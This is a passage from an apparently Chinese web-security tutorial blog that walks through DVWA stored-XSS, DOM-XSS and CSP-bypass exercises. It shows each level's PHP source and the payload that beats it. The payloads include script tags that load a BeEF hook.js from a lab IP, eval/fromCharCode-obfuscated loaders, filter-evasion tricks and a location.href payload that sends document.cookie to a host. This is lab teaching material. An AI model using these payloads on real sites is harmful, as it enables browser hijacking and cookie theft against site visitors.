                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927171209443.png"
                      alt="image-20230927171209443"
                ></p>
<h3 id="存储型-XSS"><a href="#存储型-XSS" class="headerlink" title="存储型 XSS"></a>存储型 XSS</h3><p>存储型 XSS 被保留在目标网站中，受害者浏览包含此恶意代码的网站就会执行恶意代码。通常出现在个人信息，网站留言，评论，博客日志等交互处。</p>
<h5 id="dvwa-例题-1"><a href="#dvwa-例题-1" class="headerlink" title="dvwa 例题"></a>dvwa 例题</h5><p><strong>level: Low</strong></p>
<p>源码:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123;</span><br><span class="line">	// Get input</span><br><span class="line">	$message = trim( $_POST[ &#x27;mtxMessage&#x27; ] );</span><br><span class="line">	$name    = trim( $_POST[ &#x27;txtName&#x27; ] );</span><br><span class="line"></span><br><span class="line">	// Sanitize message input</span><br><span class="line">	$message = stripslashes( $message );</span><br><span class="line">	$message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">	// Sanitize name input</span><br><span class="line">	$name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">	// Update database</span><br><span class="line">	$query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;;</span><br><span class="line">	$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">	//mysql_close();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>在留言板键入 <code>&lt;script src=&quot;http://192.168.152.128:3000/hook.js&quot;&gt;</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927163730628.png"
                      alt="image-20230927163730628"
                ></p>
<p>成功上线BeEF。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927163814502.png"
                      alt="image-20230927163814502"
                ></p>
<p><strong>level: Medium</strong></p>
<p>源码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123;</span><br><span class="line">	// Get input</span><br><span class="line">	$message = trim( $_POST[ &#x27;mtxMessage&#x27; ] );</span><br><span class="line">	$name    = trim( $_POST[ &#x27;txtName&#x27; ] );</span><br><span class="line"></span><br><span class="line">	// Sanitize message input</span><br><span class="line">	$message = strip_tags( addslashes( $message ) );</span><br><span class="line">	$message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">	$message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">	// Sanitize name input</span><br><span class="line">	$name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $name );</span><br><span class="line">	$name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">	// Update database</span><br><span class="line">	$query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;;</span><br><span class="line">	$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">	//mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p><code>str_replace</code> 可以通过双写或者大写等绕过。</p>
<p>payload:</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;scrip&lt;script&gt;t&gt;<span class="attr">http</span>:<span class="comment">//192.168.152.128:3000/hook.js&lt;/scrip&lt;script&gt;t&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>限制了输入长度，将其改为 200。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927172843131.png"
                      alt="image-20230927172843131"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927173103574.png"
                      alt="image-20230927173103574"
                ></p>
<p>成功上线 BeEF。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927173151375.png"
                      alt="image-20230927173151375"
                ></p>
<p><strong>level: High</strong></p>
<p>源码:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123;</span><br><span class="line">	// Get input</span><br><span class="line">	$message = trim( $_POST[ &#x27;mtxMessage&#x27; ] );</span><br><span class="line">	$name    = trim( $_POST[ &#x27;txtName&#x27; ] );</span><br><span class="line"></span><br><span class="line">	// Sanitize message input</span><br><span class="line">	$message = strip_tags( addslashes( $message ) );</span><br><span class="line">	$message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">	$message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">	// Sanitize name input</span><br><span class="line">	$name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $name );</span><br><span class="line">	$name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">	// Update database</span><br><span class="line">	$query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;;</span><br><span class="line">	$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">	//mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>和 xss-r 的 High 难度一样，通过编码绕过。</p>
<p>payload:</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;nonexistent.jpg&quot;</span> onerror=<span class="string">&quot;eval(&#x27;var s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.src=String.fromCharCode(104,116,116,112,58,47,47,49,57,50,46,49,54,56,46,49,53,50,46,49,50,56,58,51,48,48,48,47,104,111,111,107,46,106,115);document.head.appendChild(s);&#x27;)&quot;</span>&gt;</span><br></pre></td></tr></table></figure></div>

<p>修改 Message 可输入长度。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927173609007.png"
                      alt="image-20230927173609007"
                ></p>
<p>成功上线 BeEF。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927173705996.png"
                      alt="image-20230927173705996"
                ></p>
<h3 id="DOM-型-XSS"><a href="#DOM-型-XSS" class="headerlink" title="DOM 型 XSS"></a>DOM 型 XSS</h3><p>DOM 型 XSS 可以在前端通过 js 渲染来完成数据的交互，达到插入数据造成 XSS 脚本攻击。因 ‘#’ 后面的内容不会发送到服务器上，所以即使抓包无无法抓取到这里的流量，也不会经过服务器过滤器阻止。而反射性与存储型 XSS 需要与服务器交互，这便是三者的区别。</p>
<p><a class="link"   href="https://blog.csdn.net/qq_53577336/article/details/122441536" >DOM参考 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h5 id="dvwa-例题-2"><a href="#dvwa-例题-2" class="headerlink" title="dvwa 例题"></a>dvwa 例题</h5><p><strong>level: Low</strong></p>
<p>源码:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"># No protections, anything goes</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>select 任意一种语言后</p>
<p><code>URL: http://127.0.0.1/DVWA/vulnerabilities/xss_d/?default=English</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927184520953.png"
                      alt="image-20230927184520953"
                ></p>
<p>更改 default 参数。</p>
<p>payload:</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;http://192.168.152.128:3000/hook.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>

<p> 成功上线 BeEF。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927185920467.png"
                      alt="image-20230927185920467"
                ></p>
<p><strong>level: Medium</strong></p>
<p>源码:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// Is there any input?</span><br><span class="line">if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#x27;default&#x27; ]) ) &#123;</span><br><span class="line">	$default = $_GET[&#x27;default&#x27;];</span><br><span class="line"></span><br><span class="line">	# Do not allow script tags</span><br><span class="line">	if (stripos ($default, &quot;&lt;script&quot;) !== false) &#123;</span><br><span class="line">		header (&quot;location: ?default=English&quot;);</span><br><span class="line">		exit;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>不允许 <code>&lt;script</code> 执行，更换闭合方式即可。</p>
<p>payload:</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;<span class="regexp">/option&gt;&lt;/</span>select&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">&quot;eval(&#x27;var s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.src=String.fromCharCode(104,116,116,112,58,47,47,49,57,50,46,49,54,56,46,49,53,50,46,49,50,56,58,51,48,48,48,47,104,111,111,107,46,106,115);document.head.appendChild(s);&#x27;)&quot;</span>&gt;</span></span></span><br></pre></td></tr></table></figure></div>

<p>成功上线 BeEF。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927192547528.png"
                      alt="image-20230927192547528"
                ></p>
<p><strong>level: High</strong></p>
<p>源码:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// Is there any input?</span><br><span class="line">if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#x27;default&#x27; ]) ) &#123;</span><br><span class="line"></span><br><span class="line">	# White list the allowable languages</span><br><span class="line">	switch ($_GET[&#x27;default&#x27;]) &#123;</span><br><span class="line">		case &quot;French&quot;:</span><br><span class="line">		case &quot;English&quot;:</span><br><span class="line">		case &quot;German&quot;:</span><br><span class="line">		case &quot;Spanish&quot;:</span><br><span class="line">			# ok</span><br><span class="line">			break;</span><br><span class="line">		default:</span><br><span class="line">			header (&quot;location: ?default=English&quot;);</span><br><span class="line">			exit;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>服务端的白名单，可用 # 绕过，# 后的 js 将在本地解析，而不会上传至服务器，并且这个脚本对以上通用。</p>
<p>payload:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?default=English#&lt;script src=&quot;http://192.168.152.128:3000/hook.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>

<p>成功上线 BeEF。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927193324140.png"
                      alt="image-20230927193324140"
                ></p>
<h2 id="XSS进阶"><a href="#XSS进阶" class="headerlink" title="XSS进阶"></a>XSS进阶</h2><h3 id="CSP简述"><a href="#CSP简述" class="headerlink" title="CSP简述"></a>CSP简述</h3><p>CSP（Content Security Policy，内容安全策略），是网页应用中常见的一种安全保护机制，采取白名单制度，开发者告诉客户端，哪些外部资源可以加载和执行，哪些不可以。通过 <code>HTTP</code> 消息头或者 <code>HTML</code> 的 <code>Meta</code> 标签中设置。正常 <code>CSP</code> 有多组策略组成，每组策略包含一个策略指令和内容源列表。</p>
<ul>
<li><p>通过<code>HTTP</code>消息头设置：</p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Security-policy</span><span class="punctuation">: </span>default-src &#x27;self&#x27;; script-src &#x27;self&#x27; allowed.com; img-src &#x27;self&#x27; allowed.com; style-src &#x27;self&#x27;;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>通过<code>HTML</code> 的 <code>Meta</code> 标签中设置：</p>
<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; img-src https://*; child-src &#x27;none&#x27;;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
<p><strong>CSP指令</strong></p>
<ul>
<li>script-src：外部脚本</li>
<li>style-src：样式表</li>
<li>img-src：图像</li>
<li>media-src：媒体文件（音频和视频）</li>
<li>font-src：字体文件</li>
<li>object-src：插件（比如 Flash）</li>
<li>child-src：框架</li>
<li>frame-ancestors：嵌入的外部资源（比如<code>&lt;frame&gt;</code>、<code>&lt;iframe&gt;</code>、<code>&lt;embed&gt;</code>和<code>&lt;applet&gt;</code>）</li>
<li>connect-src：HTTP 连接（通过 XHR、WebSockets、EventSource等）</li>
<li>worker-src：worker脚本</li>
<li>manifest-src：manifest 文件</li>
<li>dedault-src：默认配置</li>
<li>frame-ancestors：限制嵌入框架的网页</li>
<li>base-uri：限制&lt;base#href&gt;</li>
<li>form-action：限制&lt;form#action&gt;</li>
<li>block-all-mixed-content：HTTPS 网页不得加载 HTTP 资源（浏览器已经默认开启）</li>
<li>upgrade-insecure-requests：自动将网页上所有加载外部资源的 HTTP 链接换成 HTTPS 协议</li>
<li>plugin-types：限制可以使用的插件格式</li>
<li>sandbox：浏览器行为的限制，比如不能有弹出窗口等。</li>
</ul>
<p><strong>CSP指令值</strong></p>
<ul>
<li>*： 星号表示允许任何URL资源，没有限制；</li>
<li>self： 表示仅允许来自同源（相同协议、相同域名、相同端口）的资源被页面加载；</li>
<li>data：仅允许数据模式（如Base64编码的图片）方式加载资源；</li>
<li>none：不允许任何资源被加载；</li>
<li>unsafe-inline：允许使用内联资源，例如内联<code>&lt;script&gt;</code>标签，内联事件处理器，内联<code>&lt;style&gt;</code>标签等，但出于安全考虑，不建议使用；</li>
<li>nonce：通过使用一次性加密字符来定义可以执行的内联js脚本，服务端生成一次性加密字符并且只能使用一次；</li>
</ul>
<h3 id="CSP绕过"><a href="#CSP绕过" class="headerlink" title="CSP绕过"></a><a class="link"   href="https://zhuanlan.zhihu.com/p/368865224" >CSP绕过 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h3><h4 id="location-href绕过"><a href="#location-href绕过" class="headerlink" title="location.href绕过"></a>location.href绕过</h4><p>很多网站常常不得已需要执行内联，CSP不影响location.href跳转。我们可以借此执行 <code>JavaScript</code>，也可以利用 <code>loction</code>跳转外带数据。</p>
<p><strong>location-herf.php</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if (!isset($_COOKIE[&#x27;a&#x27;])) &#123;</span><br><span class="line">        setcookie(&#x27;a&#x27;,md5(rand(0,1000)));</span><br><span class="line">    &#125;</span><br><span class="line">        header(&quot;Content-Security-Policy: default-src &#x27;self&#x27;;&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;CSP Test&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;CSP-safe&lt;/h2&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    if (isset($_GET[&#x27;a&#x27;])) &#123;</span><br><span class="line">        echo &quot;Your GET content&quot;.@$_GET[&#x27;a&#x27;];</span><br><span class="line">    &#125;//</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20231007165318034.png"
                      alt="image-20231007165318034"
                ></p>
<p><strong>payload</strong></p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">?a=<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">location.<span class="property">href</span>=<span class="string">&quot;http://127.0.0.1&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20231007165343194.png"
                      alt="image-20231007165343194"
                ></p>
<h4 id="dvwa-例题-3"><a href="#dvwa-例题-3" class="headerlink" title="dvwa 例题"></a>dvwa 例题</h4><h5 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h5><ul>
<li>源码</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$headerCSP = &quot;Content-Security-Policy: script-src &#x27;self&#x27; https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com ;&quot;; // allows js from self, pastebin.com, hastebin.com, jquery and google analytics.</span><br><span class="line"></span><br><span class="line">header($headerCSP);</span><br><span class="line"></span><br><span class="line"># These might work if you can&#x27;t create your own for some reason</span><br><span class="line"># https://pastebin.com/raw/R570EE00</span><br><span class="line"># https://www.toptal.com/developers/hastebin/raw/cezaruzeka</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if (isset ($_POST[&#x27;include&#x27;])) &#123;</span><br><span class="line">$page[ &#x27;body&#x27; ] .= &quot;</span><br><span class="line">    &lt;script src=&#x27;&quot; . $_POST[&#x27;include&#x27;] . &quot;&#x27;&gt;&lt;/script&gt;</span><br><span class="line">&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$page[ &#x27;body&#x27; ] .= &#x27;</span><br><span class="line">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">    &lt;p&gt;You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:&lt;/p&gt;</span><br><span class="line">    &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&#x27;;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 白名单</span><br><span class="line">https://pastebin.com</span><br><span class="line">hastebin.com</span><br><span class="line">example.com</span><br><span class="line">code.jquery.com</span><br><span class="line">https://ssl.google-analytics.com</span><br></pre></td></tr></table></figure></div>

<p>headerCSP 放置了一些 url，使用 script src 指令 指向一个外部 JavaScript 文件，header() 函数以原始形式将 HTTP 标头发送到客户端或浏览器，源码对 HTTP 头定义了 CSP 标签，从而定义了可以接受外部 JavaScript 资源的白名单。</p>
<ul>
<li>Attack</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20231011111416286.png"
                      alt="image-20231011111416286"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20231011111726446.png"
                      alt="image-20231011111726446"
                ></p>
<p>首先在白名单网站<code>https://pastebin.com/</code>里边创建一个 <code>JavaScript</code> 代码<code>alert(&quot;XSS&quot;)</code>保存记住链接<code>eg: https://pastebin.com/raw/Qp0pTUvF</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20231011111850527.png"
                      alt="image-20231011111850527"
                ></p>
<p>输入后，点击<code>include</code>。因为网站在是国外的，访问较慢，可能不会出现弹窗。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20231011112448886.png"
                      alt="image-20231011112448886"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20231011112509622.png"
                      alt="image-20231011112509622"
                > </p>
<p>抓包看一下，请求已经发送出去了。</p>
<h5 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h5><ul>
<li>源码</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$headerCSP = &quot;Content-Security-Policy: script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; &#x27;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#x27;;&quot;;</span><br><span class="line"></span><br><span class="line">header($headerCSP);</span><br><span class="line"></span><br><span class="line">// Disable XSS protections so that inline alert boxes will work</span><br><span class="line">header (&quot;X-XSS-Protection: 0&quot;);</span><br><span class="line"></span><br><span class="line"># &lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;alert(1)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if (isset ($_POST[&#x27;include&#x27;])) &#123;</span><br><span class="line">$page[ &#x27;body&#x27; ] .= &quot;</span><br><span class="line">    &quot; . $_POST[&#x27;include&#x27;] . &quot;</span><br><span class="line">&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$page[ &#x27;body&#x27; ] .= &#x27;</span><br><span class="line">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">    &lt;p&gt;Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.&lt;/p&gt;</span><br><span class="line">    &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&#x27;;</span><br></pre></td></tr></table></figure></div>

<p><code>CSP</code> 策略尝试使用 <code>nonce</code> 来防止攻击者添加内联脚本。<code>HTTP</code> 头信息中的 <code>script-src</code> 的合法来源发生了变化。<code>script-src</code> 还可以设置一些特殊值，<code>unsafe-inline</code> 允许执行页面内嵌的 <code>&lt;script&gt;</code>标签和事件监听函数，<code>nonce</code> 值会在每次 <code>HTTP</code> 回应给出一个授权 <code>token</code>。</p>
<ul>
<li>Attack</li>
</ul>
<p><code>payload</code>:</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script nonce=<span class="string">&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;</span>&gt;<span class="title function_">alert</span>(<span class="string">&quot;XSS&quot;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
